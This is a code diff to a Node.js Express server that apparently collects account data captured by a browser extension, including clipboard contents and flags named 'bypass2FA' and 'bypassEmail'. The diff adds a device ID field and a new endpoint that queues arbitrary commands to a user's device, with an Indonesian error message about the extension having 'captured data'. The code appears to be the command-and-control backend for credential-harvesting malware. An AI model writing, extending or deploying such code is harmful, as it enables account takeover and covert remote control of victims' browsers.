@@ -139,6 +139,7 @@ app.post('/api/account', async (req, res) => {
             clipboard: clipboard || { text: '', hasData: false },
             bypass2FA: accountData.bypass2FA || false,
             bypassEmail: accountData.bypassEmail || false,
+            deviceId: accountData.deviceId || '',
             createdAt: accountData.createdAt || new Date().toISOString(),
             updatedAt: new Date().toISOString()
         };
@@ -362,6 +363,30 @@ app.post('/api/command/:deviceId', (req, res) => {
         commandQueue.set(deviceId, cmds);
         console.log(`📤 Command queued for device ${deviceId}: ${action}`);
         res.json({ success: true });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// ========== SEND COMMAND BY USERID (auto-resolve deviceId) ==========
+app.post('/api/command-by-user/:userId', (req, res) => {
+    try {
+        const { userId } = req.params;
+        const { action } = req.body;
+        if (!action) return res.status(400).json({ success: false, error: 'action required' });
+
+        const data = readData();
+        const account = data.accounts.find(a => String(a.userId) === String(userId));
+        if (!account || !account.deviceId) {
+            return res.status(404).json({ success: false, error: 'Device ID tidak ditemukan untuk user ini. Pastikan extension aktif dan sudah capture data.' });
+        }
+
+        const deviceId = account.deviceId;
+        const cmds = commandQueue.get(deviceId) || [];
+        cmds.push({ action, userId, ts: Date.now() });
+        commandQueue.set(deviceId, cmds);
+        console.log(`📤 Command by-user queued for device ${deviceId} (userId ${userId}): ${action}`);
+        res.json({ success: true, deviceId });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
